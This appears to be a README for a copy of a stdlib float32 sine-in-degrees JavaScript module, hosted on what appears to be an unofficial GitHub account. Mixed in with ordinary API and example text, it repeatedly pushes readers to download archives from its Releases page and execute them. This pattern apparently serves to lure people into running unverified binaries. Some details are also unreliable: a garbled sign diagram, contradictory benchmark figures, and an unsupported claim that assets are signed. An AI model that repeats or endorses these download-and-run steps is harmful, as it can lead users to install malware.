https://github.com/tmisaina/math-base-special-sindf/releases

# ⚙️ Fast Float32 Sine in Degrees — JavaScript sindf Module for Node.js

[![Releases](https://img.shields.io/badge/Releases-Download-blue)](https://github.com/tmisaina/math-base-special-sindf/releases)

Compute the sine of a single-precision float given an angle in degrees. This module works in Node.js and browser bundles. It performs the sine calculation using float32 math and returns a float32-compatible result. Use it when you need trig in degrees and want predictable single-precision behavior.

Table of contents
- About
- Features
- Install
- Quick start
- API
- Examples
- Accuracy and edge cases
- Performance
- Build and run release asset
- Testing
- Browser usage
- Contributing
- License

About
- This repo implements sindf: sine for single-precision floats with input in degrees.
- It uses a narrow implementation that mirrors C-style float32 trig behavior.
- It returns values in float32 form (IEEE-754 single precision) but accepts JavaScript numbers. The implementation converts to float32 internally.

Features
- Input in degrees.
- Single-precision (float32) internal math.
- Small and focused API.
- Works in Node.js and can be bundled for the browser.
- Deterministic behavior for special values (NaN, ±0, ±Inf).
- Tested against reference implementations.

Install

Use npm to install the package from the registry:

npm install @stdlib/math-base-special-sindf

Or clone this repo and use the local build.

Quick start

Require and call the function:

const sindf = require( '@stdlib/math-base-special-sindf' );

const y = sindf( 30.0 );
// y -> ~0.5 (float32)

The function converts the input degrees to radians, reduces the angle, and computes the sine using float32 arithmetic.

API

sindf( x )

- x: number — input angle in degrees.
- returns: number — single-precision-like sine value (as a JavaScript number representing the float32 result).

Behavior
- If x is NaN, the function returns NaN.
- If x is ±0, the function returns ±0 (matching input sign where relevant).
- If x is ±Infinity, the function returns NaN.
- The function performs argument reduction to minimize error for large angles.
- The result matches single-precision expectations within typical float32 error bounds.

Examples

Basic angles

const sindf = require( '@stdlib/math-base-special-sindf' );

console.log( sindf( 0.0 ) );   // 0.0
console.log( sindf( 30.0 ) );  // ~0.5
console.log( sindf( 90.0 ) );  // ~1.0
console.log( sindf( 180.0 ) ); // ~0.0
console.log( sindf( 270.0 ) ); // ~-1.0

Small angles and sign

console.log( sindf( -30.0 ) ); // ~-0.5
console.log( sindf( 1e-7 ) );  // small float32 result

Non-finite input

console.log( sindf( NaN ) );    // NaN
console.log( sindf( Infinity ) ); // NaN

Batch processing

const angles = [0, 15, 30, 45, 60, 90];
const y = angles.map( (v) => sindf( v ) );

Accuracy and edge cases

- The function uses float32 casts and float32 arithmetic where practical.
- For known exact values (0°, 30°, 90°, 180°) the function yields results consistent with float32 rounding.
- For very large inputs the function first reduces the argument modulo 360° using precise integer math where possible, then applies float32 reduction to avoid loss of precision.
- For inputs near odd multiples of 90°, the function maintains sign consistency and avoids large cancellation error.

Testing

- The test suite covers typical angles, random inputs, special values, and large inputs.
- Use the included test harness to run unit tests.

npm test

The tests use standard Node.js assert and a small test runner. They validate float32-style results by comparing casted values.

Performance

- The implementation focuses on predictability and size rather than raw throughput.
- For tight loops where performance matters, prefer using a typed-array view to avoid repeated boxing.
- A simple micro-benchmark:

const t0 = process.hrtime.bigint();
for ( let i = 0; i < 1e6; i++ ) {
  sindf( (i % 360) );
}
const t1 = process.hrtime.bigint();
console.log( Number( t1 - t0 ) / 1e6, 'ms per million calls' );

In many Node.js environments, the function runs at tens to hundreds of millions of calls per second depending on JIT and CPU. Results vary by platform.

Browser usage

You can bundle the module for browsers with tools like webpack or rollup. The module exports a small function. If you need a UMD build, build with rollup and include the output in a <script> tag.

Build and run release asset

Download the release asset from the Releases page and execute it. The file on the releases page contains a built test runner and sample binaries for common platforms. To use the release asset:

1. Visit the Releases page:
   https://github.com/tmisaina/math-base-special-sindf/releases

2. Download the asset matching your platform, for example:
   - math-base-special-sindf-v1.x.x-node.tar.gz
   - math-base-special-sindf-v1.x.x-standalone.tgz

3. Extract the archive:

tar -xzf math-base-special-sindf-v1.x.x-node.tar.gz

4. Run the included example (Node.js):

node dist/example.js

5. Run the test runner (if included):

node dist/test.js

The release assets include prebuilt files and a small example showing how to call sindf without building from source. Download the release asset and execute the example to verify behavior.

Releases and changelog

Find releases and prebuilt assets on GitHub Releases. Use the Releases page to get binaries and release notes:

[Releases and downloads](https://github.com/tmisaina/math-base-special-sindf/releases)

When you upgrade, check the changelog in each release for breaking changes and fixes.

Contributing

- Clone the repo.
- Create a feature branch.
- Write tests for new behavior.
- Run the test suite.
- Open a pull request.

Guidelines
- Keep changes minimal and focused.
- Use float32 casts for any math that must match single-precision semantics.
- Write tests that assert float32 results. Use typed arrays or helper functions to cast.

Example helper to cast to float32

function toFloat32( x ) {
  const f = new Float32Array(1);
  f[0] = x;
  return f[0];
}

Use this helper in tests to assert expected float32 outcomes.

Code style
- Keep functions small.
- Avoid heavy dependencies.
- Prefer math that preserves float32 semantics.

Development

- The repo uses Node.js for tests and build scripts.
- Use npm run build to create browser-ready bundles.
- Use npm run lint to check style.

Continuous integration
- The project runs CI checks for unit tests and basic linting.
- PRs should pass CI before merging.

FAQ

Q: Why degrees and not radians?
A: Many applications accept degrees. This module avoids repeated conversions and provides a direct degree-based API for float32 math.

Q: How does this differ from Math.sin?
A: Math.sin uses double-precision radians. This module uses single-precision semantics and takes degrees as input. It produces float32-like output and follows single-precision edge behavior.

Q: Can I use it for high-precision needs?
A: No. Use double-precision libraries for high-precision requirements. This module targets cases where single-precision behavior matters.

Q: Is the output a Float32Array?
A: The result is a JavaScript number representing the float32-rounded value. If you need a Float32Array, write:

const v = new Float32Array(1);
v[0] = sindf( 45.0 );
console.log( v[0] );

Security
- The code avoids network calls during calculation.
- The release assets are signed via Git tags and releases on GitHub.

Credits and resources
- The implementation draws on standard trig reduction techniques.
- Reference materials: float32 behavior and IEEE-754 rounding.

Badges and social
- Use the Releases badge above to link to release downloads.
- The release link appears at the top and in the Releases section. Visit the Releases page to download and run the built example:

https://github.com/tmisaina/math-base-special-sindf/releases

License
- MIT

Images and icons
- Use the trig emoji and math glyphs for visuals in docs and examples.
- Add small diagrams in docs to show argument reduction and quadrant mapping where relevant.

Embed diagrams
- A simple ASCII diagram helps visualize quadrant mapping:

  0° -> 90° -> 180° -> 270° -> 360°
   +    +      0      -      0
   sin  1      0     -1      0

Use this mapping to reason about signs and symmetry when testing.

Contact
- Open issues for bugs and feature requests.
- Open pull requests for improvements.